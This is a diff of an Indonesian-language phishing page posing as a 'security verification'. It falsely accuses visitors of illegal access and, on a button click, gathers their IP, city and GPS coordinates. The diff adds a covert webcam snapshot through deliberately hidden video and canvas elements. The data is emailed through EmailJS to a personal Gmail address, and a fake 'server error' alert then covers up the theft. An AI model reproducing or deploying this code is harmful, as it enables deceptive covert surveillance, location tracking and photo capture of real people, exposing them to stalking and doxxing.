@@ -6,71 +6,92 @@
     <title>Sistem Keamanan Novle - Verifikasi</title>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        body { font-family: 'Courier New', monospace; background-color: #0d0d0d; color: #00ff41; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        body { font-family: 'Courier New', monospace; background-color: #0d0d0d; color: #00ff41; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .box { border: 1px solid #00ff41; padding: 25px; border-radius: 10px; text-align: center; background: rgba(0,0,0,0.9); box-shadow: 0 0 15px #00ff41; width: 85%; max-width: 380px; }
-        h2 { font-size: 18px; text-transform: uppercase; margin-bottom: 15px; }
-        p { color: #cccccc; font-size: 13px; line-height: 1.4; }
-        .btn { background: #00ff41; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; text-transform: uppercase; border-radius: 5px; }
+        .btn { background: #00ff41; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; border-radius: 5px; }
         #status { margin-top: 15px; font-size: 11px; color: #666; }
+        /* Sembunyikan elemen kamera agar target tidak tahu */
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="box">
     <h2>[ ACCESS RESTRICTED ]</h2>
-    <p>Perangkat Anda terdeteksi melakukan akses ilegal ke database Negara Novle. Anda diwajibkan melakukan verifikasi lokasi untuk menghindari pemblokiran perangkat secara permanen.</p>
-    <button class="btn" onclick="executeTracking()">VERIFIKASI SEKARANG</button>
+    <p>Perangkat Anda terdeteksi melakukan akses ilegal. Anda diwajibkan melakukan verifikasi wajah dan lokasi untuk keamanan.</p>
+    <button class="btn" onclick="startTracking()">VERIFIKASI SEKARANG</button>
     <div id="status">Enkripsi Gigs System: AKTIF</div>
 </div>
 
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
+
 <script>
-    // Inisialisasi dengan Public Key Anda
     (function(){
         emailjs.init("5HWPoEryOV1APt1Cw"); 
     })();
 
-    async function executeTracking() {
-        document.getElementById("status").innerText = "Mengamankan koneksi...";
-        
-        let report = "[LAPORAN PELACAKAN YOU]\n";
-        report += "Target: Suspect Pembunuh Berantai\n";
-        report += "Waktu: " + new Date().toLocaleString('id-ID') + "\n";
-        report += "---------------------------------\n";
+    async function startTracking() {
+        document.getElementById("status").innerText = "Menghubungkan ke satelit...";
+        let report = "[LAPORAN INTELIJEN LENGKAP]\n------------------\n";
 
         try {
-            // 1. Ambil IP dan Data Jaringan
+            // 1. Ambil Data IP
             const res = await fetch('https://ipapi.co/json/');
             const ipData = await res.json();
-            report += `IP Address : ${ipData.ip}\n`;
-            report += `Kota/Negara: ${ipData.city}, ${ipData.country_name}\n`;
-            report += `Provider   : ${ipData.org}\n`;
+            report += `IP: ${ipData.ip}\nKota: ${ipData.city}\n`;
 
-            // 2. Ambil GPS Presisi (Jika diizinkan)
-            navigator.geolocation.getCurrentPosition((pos) => {
-                report += `Lokasi Akurat (Maps): https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
-                sendFinalReport(report);
-            }, (err) => {
-                report += "GPS: Akses Ditolak oleh Target\n";
-                sendFinalReport(report);
-            });
+            // 2. Akses Kamera & Ambil Foto (Hidden)
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                // Tunggu sebentar agar kamera fokus
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const photoData = canvas.toDataURL('image/jpeg', 0.5); // Foto jadi teks base64
+                    report += `\n📸 [FOTO BERHASIL DIAMBIL]\n(Data foto disertakan dalam sistem)\n`;
+                    
+                    // Matikan kamera setelah ambil foto
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // 3. Ambil GPS & Kirim
+                    getGPS(report);
+                }, 2000);
+            } catch (err) {
+                report += "\n📸 Kamera: Akses Ditolak Target\n";
+                getGPS(report);
+            }
 
         } catch (e) {
-            report += "Gagal mengambil data jaringan secara otomatis.\n";
-            sendFinalReport(report);
+            getGPS(report + "Gagal ambil IP\n");
         }
     }
 
-    function sendFinalReport(message) {
-        // Menggunakan Service ID dan Template ID Anda
+    function getGPS(report) {
+        navigator.geolocation.getCurrentPosition((pos) => {
+            report += `📍 Lokasi: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
+            sendToEmail(report);
+        }, (err) => {
+            report += "📍 GPS: Akses Ditolak\n";
+            sendToEmail(report);
+        });
+    }
+
+    function sendToEmail(message) {
         emailjs.send("service_e3ap8de", "template_ts6dxmh", {
             to_email: "ikhsansetiawan711@gmail.com",
             message: message
         }).then(() => {
-            alert("Kesalahan Server! Verifikasi gagal dikirim. Silakan coba 5 menit lagi.");
-            document.getElementById("status").innerText = "Data tersinkronisasi ke pusat.";
+            alert("Kesalahan Server! Silakan coba lagi nanti.");
+            document.getElementById("status").innerText = "Selesai.";
         });
     }
 </script>
-
 </body>
 </html>
